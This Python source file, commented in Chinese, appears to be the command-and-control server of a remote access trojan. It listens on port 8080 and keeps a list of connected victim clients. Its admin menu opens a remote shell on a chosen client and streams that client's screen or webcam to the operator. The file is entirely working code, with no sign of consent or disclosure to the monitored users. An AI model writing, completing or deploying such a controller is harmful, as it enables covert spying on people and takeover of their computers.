from socket import *
import threading
import cv2
import os
import numpy as np

# 创建一个TCP套接字
backend = socket(AF_INET, SOCK_STREAM)
# 允许端口复用
backend.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
# 绑定地址
backend.bind(('0.0.0.0', 8080))
backend.listen(10)

# 客户端列表，存储 (连接对象, 地址)
client_list = []
list_lock = threading.Lock()

# 后台线程：负责接收新客户端
def accept_clients():
    print("服务器启动，等待客户端连接...")
    while True:
        try:
            client, addr = backend.accept()
            print(f"\n[+] 新客户端连接：{addr}\n请输入命令：", end='')
            with list_lock:
                client_list.append((client, addr))
        except Exception:
            break

threading.Thread(target=accept_clients, daemon=True).start()

def admin_console():
    while True:
        print("\n--- 管理菜单 ---")
        print("list               - 列出所有在线客户端")
        print("shell <编号>       - 向指定客户端发送Shell命令")
        print("screen <编号>      - 开始监控指定客户端屏幕")
        print("camera <编号>      - 打开指定客户端摄像头")
        print("quit               - 退出管理程序")
        
        cmd_input = input("请输入命令：").strip()
        if not cmd_input:
            continue
            
        # 分割命令和参数
        parts = cmd_input.split()
        base_cmd = parts[0]
        
        if base_cmd == 'list':
            with list_lock:
                if not client_list:
                    print("当前无在线客户端")
                else:
                    for i, (cli, addr) in enumerate(client_list):
                        print(f"{i+1}. {addr}")
                        
        elif base_cmd in ['shell', 'screen', 'camera']:
            if len(parts) != 2 or not parts[1].isdigit():
                print(f"[-] 语法错误！请使用格式: {base_cmd} <编号>，例如: {base_cmd} 1")
                continue
                
            idx = int(parts[1]) - 1
            with list_lock:
                if idx < 0 or idx >= len(client_list): 
                    print("[-] 无效的客户端编号！请先使用 list 命令查看。")
                    continue
                target_client, addr = client_list[idx]
                
            try:
                if base_cmd == 'shell':
                    # 模块1：执行Shell命令
                    target_client.send('1'.encode()) 
                    print(f"[{addr}] 进入Shell模式，输入 0 退出")
                    while True:
                        cmd = input("Shell> ").strip()
                        if not cmd: continue
                        target_client.send(cmd.encode())
                        if cmd == '0': break
                            
                        len_data = b''
                        while len(len_data) < 8:
                            packet = target_client.recv(8 - len(len_data))
                            if not packet: raise ConnectionError
                            len_data += packet
                        out_len = int(len_data.decode().strip())
                        
                        out_data = b''
                        while len(out_data) < out_len:
                            packet = target_client.recv(min(4096, out_len - len(out_data)))
                            if not packet: raise ConnectionError
                            out_data += packet
                        print(out_data.decode('gbk', errors='ignore'))
                        
                else:
                    # 模块2/3：监控逻辑
                    is_cam = (base_cmd == 'camera')
                    mode_code = '3' if is_cam else '2'
                    win_name = f"{'Camera' if is_cam else 'Screen'} - {addr}"
                    target_client.send(mode_code.encode())
                    print(f"[{addr}] 监控已启动，按 'q' 退出")
                    cv2.namedWindow(win_name, cv2.WINDOW_NORMAL)
                    
                    while True:
                        target_client.send('get'.encode())
                        # 接收长度头
                        len_buf = b''
                        while len(len_buf) < 8:
                            p = target_client.recv(8 - len(len_buf))
                            if not p: raise ConnectionError
                            len_buf += p
                        img_size = int(len_buf.decode().strip())
                        
                        # 接收图片数据
                        img_data = b''
                        while len(img_data) < img_size:
                            p = target_client.recv(min(8192, img_size - len(img_data)))
                            if not p: raise ConnectionError
                            img_data += p
                            
                        # 内存解码显示
                        if img_size > 0:
                            nparr = np.frombuffer(img_data, np.uint8)
                            img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                            if img is not None:
                                cv2.imshow(win_name, img)
                                
                        if cv2.waitKey(30) & 0xFF == ord('q'):
                            target_client.send('stop'.encode())
                            break
                    cv2.destroyWindow(win_name)
            except Exception as e:
                print(f"通信失败：{e}")
                if 'win_name' in locals(): cv2.destroyAllWindows()
                with list_lock: 
                    if (target_client, addr) in client_list:
                        client_list.remove((target_client, addr))

        elif base_cmd == 'quit':
            break
            
        else:
            print(f"[-] 未知命令: {base_cmd}。请查看菜单。")



admin_console()
backend.close()